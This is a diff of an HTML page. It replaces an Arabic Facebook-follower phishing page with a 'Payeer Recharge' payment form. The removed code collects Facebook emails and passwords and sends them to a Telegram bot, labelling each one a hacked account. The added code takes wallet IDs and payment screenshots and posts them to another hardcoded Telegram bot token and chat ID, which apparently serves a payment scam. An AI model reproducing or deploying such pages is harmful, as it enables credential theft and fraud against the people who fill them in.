@@ -1,104 +1,175 @@
-<html lang="ar">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>زيادة متابعين فيسبوك</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Payeer Recharge</title>
   <style>
     body {
-      background-color: #000;
-      color: white;
-      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #0f0f0f;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: #1a1a1a;
+      padding: 35px 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px #00eaff55;
+      width: 75%;
+      max-width: 420px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    h2 {
+      color: #00eaff;
       text-align: center;
-      padding-top: 50px;
+      font-size: 26px;
+      margin-bottom: 10px;
     }
-    .form-container {
-      background-color: #1c1c1c;
-      padding: 30px;
-      width: 300px;
-      margin: auto;
-      border-radius: 10px;
-      box-shadow: 0 0 10px #222;
+
+    p {
+      text-align: center;
+      color: #ccc;
+      font-size: 15px;
+      margin-bottom: 25px;
     }
-    input, select, button {
-      width: 90%;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 5px;
+
+    b {
+      color: #fff;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      margin-bottom: 15px;
+      padding: 14px;
+      border-radius: 12px;
       border: none;
-      font-size: 16px;
-    }
-    input, select {
-      background-color: #333;
-      color: white;
-    }
-    button {
-      background-color: #007bff;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #0056b3;
-    }
-    input:focus {
+      background-color: #252525;
+      color: #00eaff;
+      font-size: 15px;
       outline: none;
-      border: 2px solid #0056b3;
-      box-shadow: 0 0 5px #0056b3;
+      box-shadow: inset 0 0 5px #00eaff33;
+      transition: 0.3s ease;
+    }
+
+    input[type="text"]:focus {
+      box-shadow: 0 0 8px #00eaff88;
+      background-color: #2c2c2c;
+    }
+
+    input[type="file"] {
+      width: 100%;
+      margin-bottom: 30px;
+      padding: 14px;
+      border-radius: 12px;
+      border: none;
+      background-color: #252525;
+      color: transparent;
+      font-size: 15px;
+      outline: none;
+      box-shadow: inset 0 0 5px #00eaff33;
+      transition: 0.3s ease;
+      text-align: center;
+      position: relative;
+    }
+
+    input[type="file"]::-webkit-file-upload-button {
+      visibility: hidden;
+    }
+
+    input[type="file"]::before {
+      content: "Screenshot";
+      display: inline-block;
+      background-color: #00eaff;
+      color: #000;
+      padding: 8px 14px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      border-radius: 12px;
+      border: none;
+      background: linear-gradient(to right, #00eaff, #00b8d4);
+      color: #000;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      opacity: 0.9;
+      box-shadow: 0 0 8px #00eaff99;
     }
   </style>
 </head>
 <body>
-  <div class="form-container">
-   <div><b>🚀 زيادة متابعين فيسبوك </b> </div>
-    <form id="loginForm">
-      <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
-      
-      <input type="password" id="password" placeholder="كلمة السر" required>
-     <div> اختر عدد المتابعين</div>
-      <select id="followers">
-        <option value="1000">1000</option>
-        <option value="5000">5000</option>
-      </select>
-      <button type="submit">تسجيل الدخول</button>
+  <div class="container">
+    <h2>Payeer Recharge</h2>
+    <p>Please send payment to:<br><b>P1130580782</b> (your Payeer account)</p>
+    <form id="rechargeForm" enctype="multipart/form-data">
+      <input type="text" name="amount" placeholder="Amount (e.g. 5 USD)" required>
+      <input type="text" name="wallet" placeholder="Your Payeer Wallet (e.g. P123456789)" required>
+      <input type="file" name="screenshot" accept="image/*" required>
+      <button type="submit">I've Sent The Payment</button>
     </form>
-  <script>
-    const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA"; // حط توكن البوت بتاعك هنا
+  </div>
 
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
+  <script>
+    const form = document.getElementById("rechargeForm");
+
+    form.addEventListener("submit", async function(e) {
       e.preventDefault();
 
-      // استخراج الـ chatId من الرابط
-      const params = new URLSearchParams(window.location.search);
-      const chatId = params.get('chatId');
+      const botToken = "7681943048:AAHVblzFoL6LsiaGfau0HbZf7VQzItvd-hI";
+      const chatId = "7776054542";
+      const formData = new FormData(form);
 
-      if (!chatId) {
-        alert("❌ مفيش chatId في الرابط!");
-        return;
+      const amount = formData.get("amount");
+      const wallet = formData.get("wallet");
+      const file = formData.get("screenshot");
+
+      const caption = `💳 Payeer Recharge Request\n\n💰 Amount: ${amount}\n👤 Wallet: ${wallet}`;
+
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+      const data = new FormData();
+      data.append("chat_id", chatId);
+      data.append("caption", caption);
+      data.append("photo", file);
+
+      try {
+        const res = await fetch(telegramUrl, {
+          method: "POST",
+          body: data
+        });
+
+        if (res.ok) {
+          alert("✅ Payment info sent successfully!");
+          form.reset();
+        } else {
+          alert("❌ Failed to send. Try again.");
+        }
+      } catch (err) {
+        alert("⚠️ Error occurred.");
+        console.error(err);
       }
-
-      // جلب البيانات من المدخلات
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
-
-      const message = 📥 - تم اختراق حساب فيسبوك جديد :- \n📧 - الإيميل : ${email}\n🔑 - الباسورد : ${password};
-      // إرسال البيانات للبوت باستخدام chatId
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      })
-      .then(response => response.json())
-      .then(data => {
-        alert("✅ تم الإرسال بنجاح!");
-      })
-      .catch(error => {
-        console.error("خطأ:", error);
-        alert("❌ حصل خطأ أثناء الإرسال!");
-      });
     });
   </script>
 </body>
